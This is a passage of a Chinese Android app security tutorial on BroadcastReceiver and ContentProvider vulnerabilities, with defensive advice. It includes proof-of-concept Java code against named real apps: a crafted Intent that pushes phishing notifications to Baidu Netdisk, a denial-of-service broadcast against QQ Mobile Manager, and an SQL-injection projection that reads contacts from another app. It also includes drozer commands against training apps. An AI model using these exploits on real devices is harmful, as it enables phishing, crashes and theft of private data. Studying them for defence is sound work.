<p><strong>漏洞原理</strong></p>
<p>暴露的Receiver对外接收Intent，如果构造恶意的消息放在Intent中传输，被调用的Receiver接收可能产生安全隐患</p>
<p><strong>漏洞复现</strong></p>
<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2013-039801.html">百度云盘手机版钓鱼、信息泄露和代码执行高危漏洞三合一</a></p>
<p><strong>漏洞描述</strong></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">百度云盘手机版存在高危漏洞，恶意攻击者通过该漏洞可以对手机用户进行钓鱼欺骗，盗取用户隐私文件和信息，以百度云盘APP权限执行任何代码。百度云盘有一个广播接收器没有对消息进行安全验证，通过发送恶意的消息，攻击者可以在用户手机通知栏上推送任意消息，点击消息后可以利用webview组件盗取本地隐私文件和执行任意代码。</span><br><span class="line">存在漏洞的组件是：com<span class="selector-class">.baidu</span><span class="selector-class">.android</span><span class="selector-class">.pushservice</span><span class="selector-class">.action</span>.MESSAGE</span><br></pre></td></tr></table></figure>
<p><strong>攻击代码</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"> i.setAction(<span class="string">&quot;com.baidu.android.pushservice.action.MESSAGE&quot;</span>)；</span><br><span class="line"> <span class="type">Bundle</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bundle</span>();</span><br><span class="line"> <span class="keyword">try</span> &#123;</span><br><span class="line">     <span class="type">JSONObject</span> <span class="variable">jsobject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line"><span class="comment">//1. phishing</span></span><br><span class="line">     <span class="type">JSONObject</span> <span class="variable">custom_content_js</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">     jsobject.put(<span class="string">&quot;title&quot;</span>, <span class="string">&quot;百度云盘【漏洞你中奖了！】&quot;</span>);</span><br><span class="line">     jsobject.put(<span class="string">&quot;description&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">     <span class="comment">//jsobject.put(&quot;url&quot;, &quot;http://bcscdn.baidu.com/netdisk/BaiduYun_5.1.0.apk&quot;);</span></span><br><span class="line">     jsobject.put(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;http://drops.wooyun.org/webview.html&quot;</span>);</span><br><span class="line">     <span class="type">JSONObject</span> <span class="variable">customcontent_js</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();          </span><br><span class="line">     customcontent_js.put(<span class="string">&quot;type&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">     customcontent_js.put(<span class="string">&quot;msg_type&quot;</span>, <span class="string">&quot;resources_push&quot;</span>);</span><br><span class="line">     customcontent_js.put(<span class="string">&quot;uk&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">     customcontent_js.put(<span class="string">&quot;shareId&quot;</span>, <span class="string">&quot;1&quot;</span>);     </span><br><span class="line">     jsobject.put(<span class="string">&quot;custom_content&quot;</span>, customcontent_js);      </span><br><span class="line">     <span class="type">String</span> <span class="variable">cmd</span>  <span class="operator">=</span> jsobject.toString();</span><br><span class="line">     b.putByteArray(<span class="string">&quot;message&quot;</span>, cmd.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line"> &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">     <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">     e.printStackTrace();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<h4 id="拒绝服务">拒绝服务</h4>
<p><strong>漏洞介绍</strong></p>
<p>如果敏感的BroadcastReceiver没有设置相应的权限保护，很容易受到攻击。最常见的是拒绝服务攻击。拒绝服务攻击指的是，传递恶意畸形的intent数据给广播接收器，广播接收器无法处理异常导致crash。<br>
拒绝服务攻击的危害视具体业务场景而定，比如一个安全防护产品的拒绝服务、锁屏应用的拒绝服务、支付进程的拒绝服务等危害就是巨大的。</p>
<p><strong>漏洞复现</strong></p>
<p>案例：<a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2013-042755.html">QQ手机管家拒绝服务漏洞</a></p>
<p><strong>攻击代码</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"><span class="type">ComponentName</span> <span class="variable">componetName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ComponentName</span>(  <span class="string">&quot;com.tencent.qqpimsecure&quot;</span>,  <span class="string">&quot;com.tencent.qqpimsecure.service.InOutCallReceiver&quot;</span>);        </span><br><span class="line">i.setComponent(componetName);      </span><br><span class="line">sendBroadcast(i);</span><br></pre></td></tr></table></figure>
<p>案例2：fourgoats.apk拒绝服务攻击崩溃</p>
<p>我们首先用drozer测试可导出组件</p>
<p><code>run app.broadcast.info  -a org.owasp.goatdroid.fourgoats</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/image-20240922203759422.png" alt="image-20240922203759422"></p>
<p>找到导出的组件</p>
<p>我们根据组件的类名找对对应的源码信息，发现需要两个参数 phoneNumber、message：</p>
<p>我们发送恶意广播：格式如下</p>
<p><code>run app.broadcast.send --action action --extra string name lisi</code></p>
<p><code>run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --extra string phoneNumber 1234 --extra string message dog</code></p>
<p>我们再向广播组件发送不完整intent，使用空 extras，可以看到应用停止运行：</p>
<p><code>run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS</code></p>
<h3 id="安全防护">安全防护</h3>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">（1）私有广播接收器设置<span class="attribute">exported</span>=’false’,并且不配置intent-filter。(私有广播接收器依然能接收到同UID的广播)。</span><br><span class="line">（2）对接收来的广播进行验证。</span><br><span class="line">（3）内部app之间的广播使用<span class="attribute">protectionLevel</span>=’signature’ 验证其是否真是内部app。</span><br><span class="line">（4）返回结果时需注意接收app是否会泄露信息。</span><br><span class="line">（5）发送的广播包含敏感信息时需指定广播接收器，使用显示意图或者setPackage(String packageName)。</span><br><span class="line">（6）使用LocalBroadcastManager。</span><br></pre></td></tr></table></figure>
<h2 id="Content-Provider组件相关漏洞">Content Provider组件相关漏洞</h2>
<p>我们创建一个Content Provider，其他应用通过<strong>ContentResolver</strong>来访问提供的数据，而<strong>ContentResolver</strong>通过uri来定位自己要访问的数据</p>
<h3 id="uri介绍">uri介绍</h3>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）定义：Uniform Resource Identifier，即统一资源标识符</span><br><span class="line">（<span class="number">2</span>）作用：唯一标识ContentProvider <span class="meta">&amp;其中的数据</span></span><br><span class="line">（<span class="number">3</span>）外界进程通过URL找到对应的ContentProvider <span class="meta">&amp;其中数据，再进行数据操作</span></span><br></pre></td></tr></table></figure>
<p><strong>自定义URI</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_92EXMEKYH5VR3J2.png" alt="image-20210922094010216"></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）标准前缀<span class="symbol">:content</span><span class="symbol">://</span> ,用来说明一个<span class="title class_">Content</span> <span class="title class_">Provider</span>控制这些数据</span><br><span class="line">（<span class="number">2</span>）<span class="variable constant_">URL</span>的标识：com.carson.provider, 用于唯一标识这个<span class="title class_">ContentProvider</span>，外部调用者可以根据这个标识来找到它。对于第三方程序，为了保证<span class="variable constant_">URL</span>标识的一致性，必须是一个完整的、小写的类名，这个标识在元素的authorities属性中说明，一般是定义该<span class="title class_">ContentProvider</span>的包.类的名称</span><br><span class="line">（<span class="number">3</span>）路径：<span class="title class_">User</span>,要操作的数据库中表的名字，或者可以自己定义，记得在使用的时候保持一致</span><br><span class="line">（<span class="number">4</span>）记录<span class="variable constant_">ID</span><span class="symbol">:id</span>, 如果<span class="variable constant_">URL</span>中包含表示需要获取的记录<span class="variable constant_">ID</span>,则返回该id对应的数据，如果没有<span class="variable constant_">ID</span>,就表示返回全部</span><br></pre></td></tr></table></figure>
<p>若要将一个字符串转换成URI，可以使用parse</p>
<p><code>Uri uri </code>=<code> </code>Uri.parse(<code>&quot;content://com.carson.provider/User&quot;</code>)；</p>
<p><strong>给出一个URI示例</strong></p>
<p><code>http://www.baidu.com:8080/wenku/jiatiao.html?id=123456&amp;name=jack</code></p>
<p>获得URI的各个部分：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">getScheme</span><span class="params">()</span></span>：获取 Uri 中的 scheme 字符串部分，在这里是 http</span><br><span class="line"><span class="function"><span class="title">getHost</span><span class="params">()</span></span>：获取 Authority 中的 Host 字符串，即 www<span class="selector-class">.baidu</span><span class="selector-class">.com</span></span><br><span class="line"><span class="function"><span class="title">getPost</span><span class="params">()</span></span>：获取 Authority 中的 Port 字符串，即 <span class="number">8080</span></span><br><span class="line"><span class="function"><span class="title">getPath</span><span class="params">()</span></span>：获取 Uri 中 <span class="selector-tag">path</span> 部分，即 wenku/jiatiao<span class="selector-class">.html</span></span><br><span class="line"><span class="function"><span class="title">getQuery</span><span class="params">()</span></span>：获取 Uri 中的 query 部分，即 id=<span class="number">15</span>&amp;name=jack</span><br><span class="line"><span class="function"><span class="title">getSchemeSpecificPart</span><span class="params">()</span></span>：域名+端口号+路径+参数</span><br><span class="line">getAuthority：获取用户信息+域名+端口号</span><br><span class="line">getUserInfo：获取用户信息数据</span><br></pre></td></tr></table></figure>
<p><strong>MIME</strong></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/ldld1717/article/details/52180017">https://blog.csdn.net/ldld1717/article/details/52180017</a></p>
<p>MIME是指定某一个拓展名的文件用那一种应用程序打开</p>
<p>就像用浏览器查看PDF格式的文件，浏览器会选择合适的应用打开。ContentProvider 会根据 URI 来返回 MIME 类型，ContentProvider 会返回一个包含两部分的字符串。MIME 类型一般包含两部分，如：</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">text</span>/html</span><br><span class="line"><span class="built_in">text</span>/css</span><br><span class="line"><span class="built_in">text</span>/xml</span><br><span class="line"><span class="built_in">application</span>/pdf</span><br></pre></td></tr></table></figure>
<p>分为类型和子类型，Android 遵循类似的约定来定义MIME类型，每个内容类型的 Android MIME 类型有两种形式：多条记录（集合）和单条记录。</p>
<ul>
<li>
<p>集合记录(dir):<br>
vnd.android.cursor.<code>dir</code>/``自定义</p>
</li>
<li>
<p>单条记录(item)：</p>
<p>vnd.android.cursor.item/自定义</p>
</li>
</ul>
<p>vnd 表示这些类型和子类型具有非标准的、供应商特定的形式。Android中类型已经固定好了，不能更改，只能区别是集合还是单条具体记录，子类型可以按照格式自己填写，在使用 Intent 时，会用到 MIME，根据 Mimetype 打开符合条件的活动。</p>
<h3 id="URI解析">URI解析</h3>
<p>这里URI代表要操作的数据，我们在对数据进行获取时需要解析URI，Android提供了两个操作URI的工具类：<strong>UriMatcher</strong> 和 <strong>ContentUris</strong></p>
<p><strong>UriMatcher</strong></p>
<ul>
<li>将需要匹配的Uri路径进行注册</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//常量UriMatcher.NO_MATCH表示不匹配任何路径的返回码</span></span><br><span class="line"><span class="type">UriMatcher</span>  <span class="variable">sMatcher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UriMatcher</span>(UriMatcher.NO_MATCH);</span><br><span class="line"><span class="comment">//如果match()方法匹配“content://com.wang.provider.myprovider/tablename”路径，返回匹配码为1</span></span><br><span class="line">sMatcher.addURI(<span class="string">&quot;content://com.wang.provider.myprovider&quot;</span>, <span class="string">&quot; tablename &quot;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="comment">//如果match()方法匹配content://com.wang.provider.myprovider/tablename/11路径，返回匹配码为2</span></span><br><span class="line">sMatcher.addURI(<span class="string">&quot;com.wang.provider.myprovider&quot;</span>, <span class="string">&quot;tablename/#&quot;</span>, <span class="number">2</span>);</span><br></pre></td></tr></table></figure>
<p>此处采用 addURI 注册了两个需要用到的 URI；注意，添加第二个 URI 时，路径后面的 id 采用了通配符形式 “#”，表示只要前面部分都匹配上了就 OK</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*:表示匹配任意长度的任意字符</span><br><span class="line"><span class="comment">#:表示匹配任意长度的数字</span></span><br><span class="line">匹配任意表的内容URI格式：</span><br><span class="line">content：<span class="regexp">//</span>com.example.app.provider/*</span><br><span class="line">匹配table表中<span class="number">1</span>任意一行数据的内容URI格式：</span><br><span class="line">content：<span class="regexp">//</span>com.example.app.procider<span class="regexp">/table/</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>注册完需要匹配的 Uri 后，可以使用 sMatcher.match(Uri) 方法对输入的 Uri 进行匹配，如果匹配就返回对应的匹配码，匹配码为调用 addURI() 方法时传入的第三个参数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (sMatcher.match(Uri.parse(<span class="string">&quot;content://com.zhang.provider.yourprovider/tablename/100&quot;</span>))) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      <span class="comment">//match 1, todo something</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span></span><br><span class="line">      <span class="comment">//match 2, todo something</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="comment">//match nothing, todo something</span></span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><strong>ContentUris</strong></p>
<p>ContentUris类用于操作Uri路径后面的ID部分，有两个常用方法：</p>
<p>withAppendedId(Uri uri, long id)和parseId(Uri uri)</p>
<ul>
<li>
<p>withAppendedId(Uri uri, long id)用于为路径加上ID部分：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;content://com.wang.provider.myprovider/tablename&quot;</span>);</span><br><span class="line"><span class="comment">//生成的Uri为：content://com.wang.provider.myprovider/tablename/10</span></span><br><span class="line"> <span class="type">Uri</span> <span class="variable">resultUri</span> <span class="operator">=</span> ContentUris.withAppendedId(uri, <span class="number">10</span>);</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>parseId(Uri uri)则从路径中获取ID部分:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;content://com.zhang.provider.myprovider/tablename/10&quot;</span>)</span><br><span class="line"><span class="comment">//获取的结果为：10</span></span><br><span class="line"><span class="type">long</span> <span class="variable">personid</span> <span class="operator">=</span> ContentUris.parseId(uri);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="ContentProvider操作数据">ContentProvider操作数据</h3>
<p>当外部应用需要对ContentProvider中的数据进行添加、删除、修改及查询操作时，可以使用ContentResolver类来完成，要获取ContentResolver对象，可以使用Activity提供getContentResolver()</p>
<p>ContentResolver类提供了与ContentProvider类相同签名的四个方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Uri <span class="title function_">insert</span><span class="params">(Uri uri, ContentValues values)</span>，往ContentProvider添加数据；</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">delete</span><span class="params">(Uri uri, String selection, String[] selectionArgs)</span>，从ContentProvider删除数据；</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">update</span><span class="params">(Uri uri, ContentValues values, String selection, String[] selectionArgs)</span>，更新ContentProvider中的数据；</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> Cursor <span class="title function_">query</span><span class="params">(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder)</span>，从ContentProvider中获取数据；</span><br></pre></td></tr></table></figure>
<p>使用ContentResolver对ContentProvider中的数据进行操作：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ContentResolver</span> <span class="variable">resolver</span> <span class="operator">=</span> getContentResolver();</span><br><span class="line"> <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;content://com.wang.provider.myprovider/tablename&quot;</span>);</span><br><span class="line"> <span class="comment">//添加一条记录</span></span><br><span class="line"> <span class="type">ContentValues</span> <span class="variable">values</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContentValues</span>();</span><br><span class="line"> values.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;wang1&quot;</span>);</span><br><span class="line"> values.put(<span class="string">&quot;age&quot;</span>, <span class="number">28</span>);</span><br><span class="line"> resolver.insert(uri, values);</span><br><span class="line"> <span class="comment">//获取tablename表中所有记录</span></span><br><span class="line"> <span class="type">Cursor</span> <span class="variable">cursor</span> <span class="operator">=</span> resolver.query(uri, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="string">&quot;tablename data&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>(cursor.moveToNext())&#123;</span><br><span class="line">   Log.i(<span class="string">&quot;ContentTest&quot;</span>, <span class="string">&quot;tablename_id=&quot;</span>+ cursor.getInt(<span class="number">0</span>)+ <span class="string">&quot;, name=&quot;</span>+ cursor.getString(<span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//把id为2的记录的name字段值更改新为zhang1</span></span><br><span class="line"><span class="type">ContentValues</span> <span class="variable">updateValues</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContentValues</span>();</span><br><span class="line">updateValues.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;zhang1&quot;</span>);</span><br><span class="line"><span class="type">Uri</span> <span class="variable">updateIdUri</span> <span class="operator">=</span> ContentUris.withAppendedId(uri, <span class="number">2</span>);</span><br><span class="line">resolver.update(updateIdUri, updateValues, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"><span class="comment">//删除id为2的记录，即字段age</span></span><br><span class="line"><span class="type">Uri</span> <span class="variable">deleteIdUri</span> <span class="operator">=</span> ContentUris.withAppendedId(uri, <span class="number">2</span>);</span><br><span class="line">resolver.delete(deleteIdUri, <span class="literal">null</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
<h3 id="监听数据变化">监听数据变化</h3>
<p>如果ContentProvider的访问者需要知道数据发生的变化，可以在ContentProvider发生数据变化时调用getContentResolver().notifyChange(uri, null)来通知注册在此URI上的访问者。只给出类中监听部分的代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyProvider</span> <span class="keyword">extends</span> <span class="title class_">ContentProvider</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> Uri <span class="title function_">insert</span><span class="params">(Uri uri, ContentValues values)</span> &#123;</span><br><span class="line">     db.insert(<span class="string">&quot;tablename&quot;</span>, <span class="string">&quot;tablenameid&quot;</span>, values);</span><br><span class="line">      getContext().getContentResolver().notifyChange(uri, <span class="literal">null</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而访问者必须使用ContentObserver对数据（数据采用uri描述）进行监听，当监听到数据变化通知时，系统就会调用ContentObserver的onChange()方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">getContentResolver().registerContentObserver(Uri.parse(<span class="string">&quot;content://com.ljq.providers.personprovider/person&quot;</span>),</span><br><span class="line">        <span class="literal">true</span>, <span class="keyword">new</span> <span class="title class_">PersonObserver</span>(<span class="keyword">new</span> <span class="title class_">Handler</span>()));</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PersonObserver</span> <span class="keyword">extends</span> <span class="title class_">ContentObserver</span>&#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="title function_">PersonObserver</span><span class="params">(Handler handler)</span> &#123;</span><br><span class="line">       <span class="built_in">super</span>(handler);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onChange</span><span class="params">(<span class="type">boolean</span> selfChange)</span> &#123;</span><br><span class="line">        <span class="comment">//to do something</span></span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<h3 id="Content-Provider漏洞原理分析">Content Provider漏洞原理分析</h3>
<ul>
<li>信息泄露</li>
<li>SQL注入</li>
<li>目录遍历</li>
</ul>
<p>Content Provider漏洞的危害：</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Android中Content </span>Provider起到在不同的进程APP之间实现共享数据的作用，通过<span class="keyword">Binder进程间通信机制以及匿名共享内存机制来实现，但是考虑到数据的安全性，我们需要设置一定的保护权限。</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">Binder进程间通信机制突破了以应用程序为边界的权限控制，是安全可控的，数据的访问接口由数据的所有者来提供，数据提供方实现安全控制，决定数据的读写操作</span></span><br><span class="line"><span class="keyword"></span>而content Provider组件本身提供了读取权限控制，这导致在使用过程中就会存在一些漏洞</span><br></pre></td></tr></table></figure>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">列出uri</span><br><span class="line"><span class="keyword">run</span> <span class="keyword">app</span>.provider.finduri 包名</span><br><span class="line"></span><br><span class="line">输出数据内容</span><br><span class="line">adb <span class="keyword">shell</span> content <span class="keyword">query</span> --uri + 具体uri路径  或者 <span class="keyword">run</span> <span class="keyword">app</span>.provider.<span class="keyword">query</span> <span class="string">&quot;具体uri&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="信息泄露">信息泄露</h4>
<p><strong>原理介绍</strong></p>
<p>content URI是一个标志provider中的数据的URI。Content URI中包含了整个provider的以符号表示的名字(它的authority)和指向一个表的名字(一个路径)。当你调用一个客户端的方法来操作一个provider中的一个表，指向表的contentURI是参数之一，如果对ContentProvider的权限没有做好控制，就有可能导致恶意的程序通过这种方式读取APP的敏感数据。</p>
<p><strong>漏洞复现</strong></p>
<p>案例：<strong>盛大有你Android存在信息泄露漏洞</strong></p>
<p><strong>目标代码</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">provider</span> <span class="attr">android:name</span>=<span class="string">&quot;.providers.YouNiProvider&quot;</span> </span></span><br><span class="line"><span class="tag">          <span class="attr">android:process</span>=<span class="string">&quot;com.snda.youni.mms&quot;</span>   <span class="attr">android:authorities</span>=<span class="string">&quot;com.snda.youni.providers.DataStructs&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>攻击代码</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">getyouni</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    ContentResolver contentresolver=getContentResolver();</span><br><span class="line">    String[] projection=&#123;<span class="string">&quot;* from contacts--&quot;</span>&#125;;</span><br><span class="line">    <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span>Uri.parse(<span class="string">&quot;content://com.snda.youni.providers.DataStructs/message_ex&quot;</span>);</span><br><span class="line">    Cursor cursor=contentresolver.query(uri.projection,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">    String text=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span>(cursor.moveToNext())&#123;</span><br><span class="line">        text+=cursor.getString(cursor.getColumnIndex(<span class="string">&quot;display_name&quot;</span>))+<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Log.i(<span class="string">&quot;TEST&quot;</span>,text);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>代码分析:</strong></p>
<p>我们可以分析目标程序的provider的进程名和授权的的URI，我们可以根据授权的URI来构建一个URI，然后通过contentresolver去读取里面的的列表名信息，这样我们就可以获取APP中的隐私数据信息。</p>
<p>案例2：sieve.apk</p>
<ul>
<li>
<p>先扫描可访问的URI<br>
<code>run scanner.provider.finduris -a &lt;包名&gt;</code><br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/image-20240923165949228.png" alt="image-20240923165949228"></p>
</li>
<li>
<p>可以对敏感信息进行读取<br>
